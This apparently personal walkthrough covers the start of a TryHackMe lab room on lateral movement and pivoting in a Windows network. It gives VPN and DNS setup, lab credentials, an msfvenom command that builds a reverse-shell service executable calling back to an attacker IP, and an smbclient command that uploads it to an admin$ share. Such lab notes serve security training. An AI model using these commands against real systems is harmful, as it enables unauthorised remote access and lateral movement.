---
title: Lateral Movement and Pivoting
---

<https://tryhackme.com/room/lateralmovementandpivoting> Common techniques used to move laterally across a Windows network.

* * * 

# Introduction

Connecting via VPN. 

- `sudo openvpn --config ~/Downloads/62836ffc2c1677004856943b-lateralmovementandpivoting.ovpn --daemon`

Edit DNS Config `/etc/resolv.conf`

```
# Generated by NetworkManager
# search hitronhub.home
# nameserver 192.168.0.1

# Added
search cyber.range za.tryhackme.com
nameserver 10.200.51.101 
nameserver 10.0.0.1
# Shorten name resolution timeouts to 1 second
options timeout:1
# Only attempt to resolve a hostname 2 times
options attempts:2
```

Get creds so we can ssh in

Your credentials have been generated: Username: arthur.campbell Password: Pksp9395

- `ssh za\\arthur.campbell@thmjmp2.za.tryhackme.com`

We also have the following information to complete the exercise:

```
User: ZA.TRYHACKME.COM\t1_leonard.summers
Password: EZpass4ever
```

Instructed to create a service payload to upload.

- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.49.50 LPORT=8945 -f exe-service -o 0xskar-service.exe`

And upload the service to the smb admin share

- `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`



